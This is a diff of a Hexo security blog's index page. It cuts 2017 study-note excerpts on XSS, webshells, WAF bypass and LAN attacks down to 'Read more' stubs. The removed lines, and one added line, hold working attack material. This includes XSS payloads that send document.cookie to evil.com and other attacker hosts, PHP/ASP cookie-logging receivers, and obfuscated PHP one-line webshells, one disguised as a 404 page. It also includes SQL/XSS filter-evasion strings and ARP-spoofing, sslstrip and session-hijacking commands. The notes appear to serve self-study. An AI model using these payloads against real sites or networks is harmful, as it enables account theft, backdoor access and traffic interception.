@@ -355,22 +355,16 @@
 
       
         
-          
-            <p>XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本）</p>
+          <p>XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本）</p>
 <h3 id="加载远程脚本-常见"><a href="#加载远程脚本-常见" class="headerlink" title="加载远程脚本(常见)"></a>加载远程脚本(常见)</h3><h4 id="XSS-获取浏览器-Cookie对象"><a href="#XSS-获取浏览器-Cookie对象" class="headerlink" title="XSS 获取浏览器 Cookie对象"></a>XSS 获取浏览器 Cookie对象</h4><p>攻击者先加载一个远程脚本js</p>
-<p><code>http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</code><br>真正的XSS Payload写在这个远程脚本中，避免在URL的参数里写入大量的JavaScript代码</p>
-<p>在evil.js中 可写入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var img = document.createElement(<span class="string">"img"</span>);</div><div class="line">img.src = <span class="string">"http://www.evil.com/log?"</span>+escape(document.cookie);</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure></p>
-<p>这段代码在页面中插入了一张看不见的图片 同时把document.cookie对象作为参数发送到远程服务器</p>
-<p><code>http://www.evil.com/log</code> 可以不存在 因为这个请求会在远程服务器的Web日志中留下记录<br>127.0.0.1 - - [24/Jul/2017:20:19:18 +8080] “GET /log?cookie1%D1234 HTTP1.1” 404 288</p>
-<h4 id="利用XSS删除文章"><a href="#利用XSS删除文章" class="headerlink" title="利用XSS删除文章"></a>利用XSS删除文章</h4><p>首先正常删除该文章的连接是<br><code>http://blog.sohu.com/manage/entry.do?m=delete&amp;id=12345678</code></p>
-<p>则只要知道文章的id 就可以通过这个请求删除改文章</p>
-<p>可以通过插入一张图片来发起一个GET请求<br>XSS Payload为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var img = document.createElement(<span class="string">"img"</span>);</div><div class="line">img.src = <span class="string">"http://blog.sohu.com/manage/entry.do?m=delete&amp;id*12345678"</span>;</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure></p>
-<h3 id="加载目标网站上不是该站的脚本"><a href="#加载目标网站上不是该站的脚本" class="headerlink" title="加载目标网站上不是该站的脚本"></a>加载目标网站上不是该站的脚本</h3><p>在目标网站上找到不是本站的js　然后渗透那个网站　重写js　来达到渗透目标网站</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(var i=0,tags=document.querySelectorAll(<span class="string">'iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'</span>),tag;tag=tags[i];i++)&#123;</div><div class="line">  var a = document.createElement(<span class="string">'a'</span>);</div><div class="line">  a.href = tag.src||tag.href||tag.data;</div><div class="line">  <span class="keyword">if</span>(a.hostname!=location.hostname)&#123;</div><div class="line">    console.warn(location.hostname+<span class="string">' 发现第三方资源['</span>+tag.localName+<span class="string">']:'</span>+a.href);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>（这段代码实际可以找出J/C）<br>将该段代码输入在控制台内 回车<br>比如在<code>www.CUC.com</code>内输入显示发现第三方资源<br><code>http://www.qaq.pw/1.js</code></p>
-<p>渗透<code>http://www.qaq.pw/1.js</code><br>在1.js下重写js 即XSS Payload</p>
-
-          
+<p><code>http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</code><br>真正的XSS Payload写在这个远程脚本中，避免在URL的参数里写入大量的JavaScript代码<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/24/xss所加载的脚本/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -501,42 +495,14 @@
 
       
         
-          
-            <h3 id="xss就是在页面执行你想要的js"><a href="#xss就是在页面执行你想要的js" class="headerlink" title="xss就是在页面执行你想要的js"></a><em>xss就是在页面执行你想要的js</em></h3><p>xss原理<br>本地搭建php环境 然后在index.php文件里写入如下代码<br>(index是普遍意义上”首页”)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt; </div><div class="line">&lt;title&gt;XSS原理重现&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"get"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"xss_input"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;?php</div><div class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">'xss_input'</span>];</div><div class="line"><span class="built_in">echo</span> <span class="string">'你输入的字符为&lt;br&gt;'</span>.<span class="variable">$xss</span>;</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
-<p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>成功弹窗<br>输出点在<code>&lt;br&gt;</code>和<code>&lt;/boby&gt;</code>里</p>
-<p>利用xss输出的环境来构造代码<br>(除了上述的在<code>&lt;br&gt;</code>和<code>&lt;/boby&gt;</code>里，还有很多其他情况)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt; </div><div class="line">&lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;center&gt;</div><div class="line">&lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt;</div><div class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"get"</span>&gt;</div><div class="line">&lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"xss_input_value"</span> value=<span class="string">"输入"</span>&gt;&lt;br&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;?php</div><div class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">'xss_input_value'</span>];</div><div class="line"><span class="keyword">if</span>(isset(<span class="variable">$xss</span>))&#123;</div><div class="line"><span class="built_in">echo</span> <span class="string">'&lt;input type="text" value="'</span>.<span class="variable">$xss</span>.<span class="string">'"&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="built_in">echo</span> <span class="string">'&lt;input type="type" value="输出"&gt;'</span>;</div><div class="line">&#125;</div><div class="line">?&gt;</div><div class="line">&lt;/center&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<p>这时输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>无弹窗<br>因为输入点在value属性里面，会被当成value里的值来显现出来，所以并没有弹窗<br><code>因此改为&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code><br>闭合input标签 成功弹窗</p>
-<p>但是会多出一个”&gt; 并会直接把多余的字符串输出<br>原因在于使用了标签 </p>
-<p>so…需要在input标签里不带标签的且可以调用js的属性<br>-&gt;on事件<br><code>&quot; onclick=&quot;alert(&#39;xss&#39;)</code><br>onclick-&gt;当鼠标点击的第二个input输入框时触发<br>也可以成功弹窗</p>
-<p>进一步 可以把onclick改成<br>Onmousemove 当鼠标移动就触发<br>Onload 当页面加载完成后触发</p>
-<p>在<code>&lt;textarea&gt;</code>标签里 或者其他优先级比script高的标签<br>通过闭合完整的标签<br><code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
-<p>几种过滤的解决办法（暂时放这）<br><code>&lt;img scr=1 onerror=alert(&#39;xss&#39;)&gt;</code>当找不到图片名为1的文件时，执行alert(‘xss’)<br><code>&lt;a href=javascrip:alert(&#39;xss&#39;)&gt;s&lt;/a&gt;</code> 点击s时运行alert(‘xss’)<br><code>&lt;iframe src=javascript:alert(&#39;xss&#39;);height=0 width=0 /&gt;&lt;iframe&gt;</code>利用iframe的scr来弹窗<br><code>&lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;</code>过滤了alert来执行弹窗</p>
-<p>xss分类<br>反射型XSS、储蓄型XSS、DOM XSS</p>
-<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>Hacker——发现存在反射XSS的URL——根据输出点的环境构造XSS代码——进行编码、缩短——发送给受害人——<br>受害打开后执行XSS代码——完成hacker想要的功能(获取cookies、url、浏览器信息、IP等等)</p>
-<p>比如<a href="http://qaq.cn/id=123存在xss漏洞" target="_blank" rel="external">http://qaq.cn/id=123存在xss漏洞</a><br>可用JSky、Safe3WVS、Netsparker等软件挖掘出部分反射XSS<br>查看网站源码（view-source:网址 或者 ctrl+u）<br>在id=123后面写abc ctrl+f搜索abc<br>看其出现在哪个位置<br>根据环境构造代码 写在之后 比如<br><code>http://qaq.cn/id=123&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code><br>把url变成短连接，发送给管理员，诱使管理员打开</p>
-<h3 id="储蓄型XSS"><a href="#储蓄型XSS" class="headerlink" title="储蓄型XSS"></a>储蓄型XSS</h3><p>储蓄型XSS其实和反射型XSS差不多，只是储蓄型把数据保存到服务端，而反射型只是让XSS游走在客户端上<br>打开留言处(book.asp)<br>先在留言里出输入<a>s</a>提交留言，F12打开审查元素，来看输入的标签是否被过滤了<br>如果<a>s</a>是彩色的说明没有过滤，如果是灰色就说明过滤了<br>若没过滤 再次留言 可写<br><code>&quot;&lt;script src=&quot;url&quot;&gt;&lt;/script&gt;请问怎么报名啊&quot;</code><br>url为你自己的网站<br>无论是谁点击了你所留言的网址（不是你自己那个网址）<br>即可收割cookie</p>
-<p>Exp 1<br><code>&lt;script src=&quot;http://qaq.com/joke.js&quot;&gt;&lt;/script&gt;</code><br>将先加载joke.js的脚本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var img = document.createElement(<span class="string">'img'</span>);</div><div class="line">img.width = 0;</div><div class="line">img.height = 0;</div><div class="line">img.src = <span class="string">'http://qaqcom/joke/joke.php?joke='</span>+encodeURIComponent(document.cookie);</div></pre></td></tr></table></figure>
-<p>创建一个img标签，将它的src属性指向.预先写好的一个脚本joke.php 并且将页面的cookie最为参数附加到url后面</p>
-<p>joke.php里解析请求里面的joke参数（即用户的cookie）然后保存</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    @ini_set(<span class="string">'display_errors'</span>,1);</div><div class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">'joke'</span>];</div><div class="line">    <span class="variable">$filePath</span> = <span class="string">"joke.php"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(is_writable(<span class="variable">$filePath</span>)==<span class="literal">false</span>)&#123;</div><div class="line">         <span class="built_in">echo</span> <span class="string">"can't write"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">          <span class="variable">$handler</span> = fopen(filePath, <span class="string">"a"</span>);</div><div class="line">          fwrite(<span class="variable">$handler</span>, <span class="variable">$str</span>);</div><div class="line">          fclose(<span class="variable">$handler</span>);</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>Exp 2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">&lt;title&gt;xx&lt;/title&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;%testfile = Server.MapPath(<span class="string">"code.txt"</span>) //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中</div><div class="line"></div><div class="line">msg = Request(<span class="string">"msg"</span>) //获取提交过来的msg变量，也就是cookie值</div><div class="line"></div><div class="line"><span class="built_in">set</span> fs = server.CreateObject(<span class="string">"scripting.filesystemobject"</span>)//创建一个fs对象</div><div class="line"></div><div class="line"><span class="built_in">set</span> thisfile = fs.OpenTextFile(testfile,8,True,0)</div><div class="line"></div><div class="line">thisfile.WriteLine(<span class="string">""</span>&amp;msg&amp;<span class="string">""</span>)//像code.txt中写入获取来的cookie</div><div class="line"></div><div class="line">thisfile.close() //关闭</div><div class="line"></div><div class="line"><span class="built_in">set</span> fs = nothing%&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
-<p>把上述文件保存为cookie.asp文件，放到自己的网站服务器下<br>xss构造为<br><code>&lt;script&gt;window.open(&#39;http://10.10.10.10/cookie.asp?msg=&#39;+document.cookie)&lt;/script&gt;</code></p>
-<p>点击留言页面后进入后页面会跳转，此时cookie就发送到自己的服务器下的code.txt文件中了</p>
-<h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h3><p>DOM XSS 从效果上来说也是反射型<br>DOM XSS是基于在js上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造xss，但是服务端对我们是不可见的</p>
-<p>file:///C:/Users/Administrator/Desktop/1.html<br>在1.html后面输入<br><code>&lt;script&gt;document.write(document.URL.substring(document.URL.indexOf(&quot;a=&quot;+2,document.URL.length));&lt;/script&gt;</code></p>
-<p>Document.write是把里面的内容写到页面里</p>
-<p>document.URL是获取URL地址</p>
-<p>Substring 从某处到某处，把之间的内容获取</p>
-<p>document.URL.indexOf(“a=”)+2是在当前URL里从开头检索a=字符，然后加2(因为a=是两个字符，我们需要把他略去)，同时他也是substring的开始值</p>
-<p>document.URL.length是获取当前URL的长度，同时也是substring的结束值</p>
-<p>合起来的意思就是：在URL获取a=后面的值，然后把a=后面的值给显示出来</p>
-<p>将显示ile:///C:/Users/Administrator/Desktop/1.html<br>因为当前url并没有a=的字符，而indexOf的特性是，当获取的值里，如果没有找到自己要检索的值的话，返回-1。找到了则返回0。那么<code>document.URL.indexOf(&quot;a=&quot;)</code>则为-1，再加上2，得1。然后一直到URL最后。这样一来，就把file的f字符给略去了，所以才会出现ile:///C:/Users/Administrator/Desktop/1.html（这点还不是很懂）</p>
-<p>在a=后面输入123<br>将显示123</p>
-<p>输入<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code><br>成功弹窗</p>
-
-          
+          <h3 id="xss就是在页面执行你想要的js"><a href="#xss就是在页面执行你想要的js" class="headerlink" title="xss就是在页面执行你想要的js"></a><em>xss就是在页面执行你想要的js</em></h3><p>xss原理<br>本地搭建php环境 然后在index.php文件里写入如下代码<br>(index是普遍意义上”首页”)<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/23/xss学习笔记/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -667,20 +633,14 @@
 
       
         
-          
-            <h3 id="一句话-bypass-waf"><a href="#一句话-bypass-waf" class="headerlink" title="一句话 bypass_waf"></a>一句话 bypass_waf</h3><p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来</p>
-<p>（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面）</p>
-<p>姿势一 php动态函数 （无eval）<br><code>&lt;?php $_POST[&#39;xx&#39;]($_POST[&#39;oo&#39;]);?&gt;</code><br>利用 在hackbar Post data<br>写入xx=assert￥oo=QAQ</p>
-<p>姿势二 无Post<br>getallheaders函数能够获取请求头内容<br><code>&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;</code><br>结合姿势一<br><code>&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt;</code></p>
-<p>姿势三 遇到会检测http请求头内容的waf<br><code>&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;])));&gt;</code><br>解开之后发现是乱码，waf识别不出来里面的内容<br>结合姿势一<br><code>&lt;?php $xx=gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;]));$xx(gzuncompress(base64_decode(getallheaders()[&#39;oo&#39;])));&gt;</code></p>
-<p>姿势四 防止管理员删shell&gt;伪装成404</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line"> </div><div class="line">...</div><div class="line"> </div><div class="line">&lt;?php</div><div class="line"><span class="variable">$xx</span>=getallheaders()[<span class="string">'xx'</span>];</div><div class="line"><span class="variable">$oo</span>=getallheaders()[<span class="string">'oo'</span>];</div><div class="line"><span class="keyword">if</span>(<span class="variable">$xx</span>!=<span class="string">""</span> and <span class="variable">$oo</span>!=<span class="string">""</span>)&#123;</div><div class="line">  <span class="variable">$xx</span>=gzuncompress(base64_decode(<span class="variable">$xx</span>));<span class="variable">$xx</span>(gzuncompress(base64_decode(<span class="variable">$oo</span>)));</div><div class="line">&#125;</div><div class="line">&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
-<h3 id="SQL-XSS-bypass-waf"><a href="#SQL-XSS-bypass-waf" class="headerlink" title="SQL XSS bypass waf"></a>SQL XSS bypass waf</h3><p>姿势一 大小写转换<br>SQL：<code>sEleCt vERsIoN()</code><br>XSS：<code>&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt;</code></p>
-<p>姿势二 字符编码<br>SQL：<code>load_file(0x633A2F77696E646F77732F6D792E696E69)</code><br>XSS：<code>&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;</code></p>
-<p>姿势三 拼凑法 其只验证一次<br>SQL：<code>selselectect verversionsion();</code><br>XSS：<code>&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt;</code></p>
-<p>姿势四 干扰字符污染法：<br>空字符 空格 TAB换行 注释 特殊的函数等等都可以<br><code>SQL：sEleCt+1-1+vERsIoN   /*!*/       ();</code>yohehe‍‍<code>`‍‍SQL2：select/*!*/</code>version<code>()</code></p>
-
-          
+          <h3 id="一句话-bypass-waf"><a href="#一句话-bypass-waf" class="headerlink" title="一句话 bypass_waf"></a>一句话 bypass_waf</h3><p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/20/bypass_waf/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -811,14 +771,14 @@
 
       
         
-          
-            <p>看hbctf的一道题学习了一点，先记录下来。<br>首先需要可以写入文件 写入php文件或asp文件均可。<br>以php为例，新建文件后写入 </p>
-<p><code>&lt;?php @eval($_POST[&#39;QAQ&#39;]);?&gt;</code><br>顺便asp为<code>&lt;%eval request(&quot;QAQ&quot;)%&gt;</code></p>
-<p>“QAQ”相当于一个标记。eval是一个php函数<br>他将符合php语法的字符当做php代码进行执行<br>即一个后门</p>
-<p>（怎么用hackbar的Post data写入文件还不会…以后回来改）</p>
-<p>连接菜刀 输入网站 和当时标记<br>即可拿shell查看文件（flag）等等</p>
-
-          
+          <p>看hbctf的一道题学习了一点，先记录下来。<br>首先需要可以写入文件 写入php文件或asp文件均可。<br>以php为例，新建文件后写入<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/18/一句话木马和中国菜刀/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -949,18 +909,15 @@
 
       
         
-          
-            <p>内网视频学习笔记(￣▽￣)~*</p>
-<h3 id="局域网断网攻击"><a href="#局域网断网攻击" class="headerlink" title="局域网断网攻击"></a>局域网断网攻击</h3><p>虚拟机 kali linux<br>arpspoof -i 网卡 -t ip 网关<br>查别人的 ip fping-asg x.0/24<br>linux ifconfig windows ipcomfig</p>
-<h3 id="arp-欺骗"><a href="#arp-欺骗" class="headerlink" title="arp 欺骗"></a>arp 欺骗</h3><p>先输入 ech0 1&gt;/proc/sys/net/ipv4/ip_forward 无回显<br>可用cat 看是否成功 cat/proc/sys/net/ipv4/ip_forward<br>再arpspoof …</p>
-<h3 id="driffnet-获取本机网卡图片"><a href="#driffnet-获取本机网卡图片" class="headerlink" title="driffnet 获取本机网卡图片"></a>driffnet 获取本机网卡图片</h3><p>driffnet -i 网卡<br>会弹一个小窗口<br>可在/tmp内找到图片</p>
-<h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>ettercap dns欺骗 流量嗅探<br>先arp欺骗 再 ettercap-Tq-i eth0<br>(Tq 启动文本模式 q安静模式)</p>
-<h3 id="https"><a href="#https" class="headerlink" title="https"></a>https</h3><p>sslstrip 将https链接还原为http （缺点：证书错误）<br>首先设置 使用 vim esc+:q!不保存退出 esc+:wq保存退出<br>vim/etc/ettercap/etter.conf<br>光标移动到 linux 删除下两个# 设置完成<br>sslstrip -a -f -k</p>
-<h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>way1 先arp欺骗<br>wireshark 抓包 ferret重新生成抓包后文件 hamster重放流量<br>输入wireshark 为图形界面<br>抓包并保存为QAQ.pacp文件<br>再ferret -r QAQ.pacp<br>生成txt文件 将该文件复制到<br>cp hamster.txt /root/<br>输入 hamster 根据提示<br>修改浏览器代理设置<br>进入网址</p>
-<p>way2<br>ferret -i eth0(网卡)<br>浏览器设置同上<br>再hamster （若有hamster文件存在需先删除）<br>进入网址同步获取</p>
-<p>way3<br><em>cookie cadger</em><br>工具一键劫持</p>
-
-          
+          <p>内网视频学习笔记(￣▽￣)~*</p>
+<h3 id="局域网断网攻击"><a href="#局域网断网攻击" class="headerlink" title="局域网断网攻击"></a>局域网断网攻击</h3><p>虚拟机 kali linux<br>arpspoof -i 网卡 -t ip 网关<br>查别人的 ip fping-asg x.0/24<br>linux ifconfig windows ipcomfig<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/05/30/lan attack/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1136,7 +1093,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/04/14/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/04/12/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Saber">
@@ -1155,7 +1112,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/04/14/hello-world/" itemprop="url">Hello World</a></h1>
+                <a class="post-title-link" href="/2017/04/12/hello-world/" itemprop="url">Hello World</a></h1>
         
 
         <div class="post-meta">
@@ -1167,8 +1124,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-14T21:57:27+08:00">
-                2017-04-14
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-12T23:50:25+08:00">
+                2017-04-12
               </time>
             
 
@@ -1203,18 +1160,14 @@
 
       
         
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
-
-          
+          <p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/04/12/hello-world/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
